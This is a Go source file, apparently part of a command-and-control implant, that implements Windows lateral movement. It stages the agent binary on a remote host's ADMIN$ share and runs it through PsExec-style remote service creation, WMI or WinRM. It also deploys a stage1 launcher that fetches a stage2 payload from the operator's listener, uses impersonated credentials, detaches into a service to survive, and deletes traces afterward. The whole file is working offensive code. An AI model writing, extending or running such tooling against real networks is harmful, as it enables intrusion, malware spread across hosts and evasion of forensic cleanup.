//go:build windows

package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"runtime"
	"strings"
	"syscall"
	"unsafe"
)

var (
	procOpenSCManagerW     = advapi32.NewProc("OpenSCManagerW")
	procOpenServiceW       = advapi32.NewProc("OpenServiceW")
	procCreateServiceW     = advapi32.NewProc("CreateServiceW")
	procStartServiceW      = advapi32.NewProc("StartServiceW")
	procDeleteServiceW     = advapi32.NewProc("DeleteServiceW")
	procCloseServiceHandle = advapi32.NewProc("CloseServiceHandle")
)

const (
	scManagerAllAccess = 0xF003F
	serviceAllAccess   = 0xF01FF
	serviceDemandStart = 3
	serviceErrorIgnore = 0
)

// runLateralChild is the --lateral-child entry point. The whole move runs
// here so the parent command loop only waits for a bounded child process.
// Failures are printed to standard output (exit 0) so the parent passes the
// explanation back to the operator as command output.
func runLateralChild(args []string) error {
	if len(args) != 2 || args[0] != "--lateral-child" {
		return errors.New("lateral child requires a JSON payload argument")
	}
	var payload lateralPayload
	if err := json.Unmarshal([]byte(args[1]), &payload); err != nil {
		return fmt.Errorf("decode lateral payload: %w", err)
	}
	result, err := lateralMove(payload)
	if err != nil {
		fmt.Println("Lateral failed: " + err.Error())
		return nil
	}
	fmt.Println(result)
	return nil
}

// lateralMove stages this agent binary on the target through the ADMIN$
// share and starts it with the requested execution method. Every network
// operation runs under this child process identity, which carries the
// active make_token credentials when one is set; without a token the move
// uses the agent's own identity and requires local admin rights on the
// target. The staged copy needs embedded connection settings (base URL and
// beacon secret) because a service process inherits no operator
// environment; build it with the server's use_server_config option.
func lateralMove(payload lateralPayload) (string, error) {
	self, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("resolve agent executable: %w", err)
	}
	parent := os.Getenv("RMM_SESSION_ID")
	if parent == "" {
		parent = "go"
	}
	targetSession := payload.SessionID
	if targetSession == "" {
		targetSession = derivedSessionID(parent, "lateral")
	}
	serviceName, binaryName, err := lateralDeploymentNames(payload.RemoteName, rand.Reader)
	if err != nil {
		return "", err
	}
	localPath := `C:\Windows\System32\` + binaryName
	agentCommand := lateralAgentCommand(localPath, targetSession, payload.WorkspaceID, serviceName)

	if payload.Method == "psexec" {
		return lateralPsexecMove(payload, targetSession, serviceName, binaryName)
	}

	// Stage the agent binary through ADMIN$ (SMB write under the active
	// identity), before requesting remote execution.
	sharePath := `\\` + payload.Host + `\ADMIN$\System32\` + binaryName
	if err := copyFile(self, sharePath); err != nil {
		return "", fmt.Errorf("stage agent on %s: %w", payload.Host, err)
	}

	switch payload.Method {
	case "wmiexec":
		if err := wmiCreateProcess(payload.Host, agentCommand); err != nil {
			return "", err
		}
	case "winrm":
		if err := winrmCreateProcess(payload.Host, localPath, targetSession, payload.WorkspaceID, serviceName); err != nil {
			return "", err
		}
	}
	return fmt.Sprintf("lateral started: method=%s host=%s target session=%s",
		payload.Method, payload.Host, targetSession), nil
}

// lateralPsexecMove deploys the embedded stage1 launcher the way RemCom and
// PsExec deploy their service: the compact binary is extracted from this
// agent's own body, staged on ADMIN$, and started as a demand-start service.
// stage1 fetches the masked stage2 payload from the listener's staging
// endpoint, installs the agent, and stops; the cleanup command then removes
// the service and the launcher binary once the agent is running.
func lateralPsexecMove(payload lateralPayload, targetSession, serviceName, binaryName string) (string, error) {
	if !bytes.HasPrefix(embeddedStage1, []byte("MZ")) {
		return "", errors.New("stage1 launcher is not embedded: build the agent through the server")
	}
	sharePath := `\\` + payload.Host + `\ADMIN$\System32\` + binaryName
	if err := os.WriteFile(sharePath, embeddedStage1, 0700); err != nil {
		return "", fmt.Errorf("stage launcher on %s: %w", payload.Host, err)
	}
	localPath := `C:\Windows\System32\` + binaryName
	binPath := fmt.Sprintf(`%s --stage %s --session %s`, localPath, payload.Stage, targetSession)
	// The service is not marked for deletion here; the cleanup command owns
	// its removal once the target agent has registered.
	if err := scmStartService(payload.Host, serviceName, binPath, false); err != nil {
		return "", err
	}
	return fmt.Sprintf("lateral started: method=psexec host=%s target session=%s service=%s binary=%s",
		payload.Host, targetSession, serviceName, binaryName), nil
}

// scmStartService creates and starts a service on the target host through
// the native SCM API. When markForDeletion is set the entry is marked for
// deletion immediately (removed once the process stops); the psexec module
// leaves the entry in place so the cleanup command owns its removal.
func scmStartService(host, serviceName, binPath string, markForDeletion bool) error {
	var machinePtr uintptr
	if host != "" {
		pointer, err := syscall.UTF16PtrFromString(`\\` + host)
		if err != nil {
			return fmt.Errorf("encode host: %w", err)
		}
		machinePtr = uintptr(unsafe.Pointer(pointer))
	}
	scm, _, callErr := procOpenSCManagerW.Call(machinePtr, 0, scManagerAllAccess)
	if scm == 0 {
		return fmt.Errorf("open SC manager on %s: %w", host, callErr)
	}
	defer procCloseServiceHandle.Call(scm)
	namePtr, err := syscall.UTF16PtrFromString(serviceName)
	if err != nil {
		return fmt.Errorf("encode service name: %w", err)
	}
	binPtr, err := syscall.UTF16PtrFromString(binPath)
	if err != nil {
		return fmt.Errorf("encode service binary: %w", err)
	}
	service, _, callErr := procCreateServiceW.Call(
		scm,
		uintptr(unsafe.Pointer(namePtr)),
		uintptr(unsafe.Pointer(namePtr)),
		serviceAllAccess,
		serviceWin32OwnProcess,
		serviceDemandStart,
		serviceErrorIgnore,
		uintptr(unsafe.Pointer(binPtr)),
		0, 0, 0, 0, 0, 0,
	)
	if service == 0 {
		return fmt.Errorf("create service on %s: %w", host, callErr)
	}
	defer procCloseServiceHandle.Call(service)
	started, _, callErr := procStartServiceW.Call(service, 0, 0)
	if markForDeletion {
		procDeleteServiceW.Call(service)
	}
	if err := serviceStartOutcome(started != 0, callErr); err != nil {
		return fmt.Errorf("start service on %s: %w", host, err)
	}
	return nil
}

// scmDeleteService removes a service on the target host; a missing service
// is reported as already removed.
func scmDeleteService(host, serviceName string) (bool, error) {
	var machinePtr uintptr
	if host != "" {
		pointer, err := syscall.UTF16PtrFromString(`\\` + host)
		if err != nil {
			return false, fmt.Errorf("encode host: %w", err)
		}
		machinePtr = uintptr(unsafe.Pointer(pointer))
	}
	scm, _, callErr := procOpenSCManagerW.Call(machinePtr, 0, scManagerAllAccess)
	if scm == 0 {
		return false, fmt.Errorf("open SC manager on %s: %w", host, callErr)
	}
	defer procCloseServiceHandle.Call(scm)
	namePtr, err := syscall.UTF16PtrFromString(serviceName)
	if err != nil {
		return false, fmt.Errorf("encode service name: %w", err)
	}
	service, _, callErr := procOpenServiceW.Call(scm, uintptr(unsafe.Pointer(namePtr)), serviceAllAccess)
	if service == 0 {
		return false, serviceLookupOutcome(callErr)
	}
	defer procCloseServiceHandle.Call(service)
	deleted, _, callErr := procDeleteServiceW.Call(service)
	if deleted == 0 {
		return false, fmt.Errorf("delete service on %s: %w", host, callErr)
	}
	return true, nil
}

// runLateralDetach re-registers this copy as a local Windows service and
// exits. The WinRM shell terminates its command process tree when the shell
// closes; the SCM-started instance runs outside that job object and
// survives it. It runs under the identity WinRM authenticated on the target.
func runLateralDetach(args []string) error {
	startup, err := parseLateralStartup(args)
	if err != nil {
		return err
	}
	self, err := os.Executable()
	if err != nil {
		return fmt.Errorf("resolve agent executable: %w", err)
	}
	binPath := strings.Join(append([]string{self}, args...), " ")
	if err := scmStartService("", startup.ServiceName, binPath, true); err != nil {
		return fmt.Errorf("detach into the local service %s: %w", startup.ServiceName, err)
	}
	return nil
}

// runLateralCleanupChild is the --lateral-cleanup-child entry point: it
// removes the psexec deployment artifacts on the target. Failures print to
// standard output (exit 0) so the parent passes the explanation back.
func runLateralCleanupChild(args []string) error {
	if len(args) != 2 || args[0] != "--lateral-cleanup-child" {
		return errors.New("lateral cleanup child requires a JSON payload argument")
	}
	var payload lateralCleanupPayload
	if err := json.Unmarshal([]byte(args[1]), &payload); err != nil {
		return fmt.Errorf("decode lateral cleanup payload: %w", err)
	}
	result, err := lateralCleanup(payload)
	if err != nil {
		fmt.Println("Lateral cleanup failed: " + err.Error())
		return nil
	}
	fmt.Println(result)
	return nil
}

// lateralCleanup deletes the temporary launcher service and the stage1
// binary on the target once the deployed agent is running.
func lateralCleanup(payload lateralCleanupPayload) (string, error) {
	serviceDeleted, serviceErr := scmDeleteService(payload.Host, payload.ServiceName)
	sharePath := `\\` + payload.Host + `\ADMIN$\System32\` + payload.BinaryName
	fileErr := os.Remove(sharePath)
	var detail strings.Builder
	if serviceErr != nil {
		fmt.Fprintf(&detail, "service error (%v)", serviceErr)
	} else if serviceDeleted {
		detail.WriteString("service deleted")
	} else {
		detail.WriteString("service not found or already removed")
	}
	switch {
	case fileErr == nil:
		detail.WriteString("; launcher binary removed from ADMIN$")
	case os.IsNotExist(fileErr):
		detail.WriteString("; launcher binary not found on ADMIN$")
	default:
		fmt.Fprintf(&detail, "; launcher binary still on ADMIN$ (%v)", fileErr)
	}
	return lateralCleanupOutcome(detail.String(), serviceErr, fileErr)
}

// lateralPsexecGoroutine runs psexec on a goroutine with a locked OS thread
// so ImpersonateLoggedOnUser (applied by reestablishThreadToken) governs the
// ADMIN$ write and SCM calls directly. This avoids CreateProcessAsUserW and
// its SE_ASSIGNPRIMARYTOKEN_PRIVILEGE requirement: thread impersonation with a
// LOGON_NEW_CREDENTIALS token covers all outbound network auth without any
// special agent privileges.
//
// The goroutine's thread impersonation is independent of the main goroutine's
// thread token; the main goroutine's impersonation state is not affected.
func lateralPsexecGoroutine(ctx context.Context, payload lateralPayload) (string, error) {
	type resultT struct {
		result string
		err    error
	}
	ch := make(chan resultT, 1)
	go func() {
		runtime.LockOSThread()
		defer func() {
			if ok, _, err := procRevertToSelf.Call(); ok == 0 {
				identityBoundaryFailure(fmt.Errorf("clear worker thread token: %w", err))
				// Exiting while pinned makes the Go runtime discard this thread.
				return
			}
			runtime.UnlockOSThread()
		}()
		// Apply the active make_token credentials to this goroutine's OS thread.
		// This is a no-op when no token is active, so psexec still works under
		// the agent's own identity.
		reestablishThreadToken()
		if identityBoundaryFault.Load() {
			ch <- resultT{"", errIdentityUnsafe}
			return
		}
		result, err := lateralMove(payload)
		ch <- resultT{result, err}
	}()
	select {
	case r := <-ch:
		return r.result, r.err
	case <-ctx.Done():
		return "", errors.New("lateral psexec timed out; the target may still be starting")
	}
}
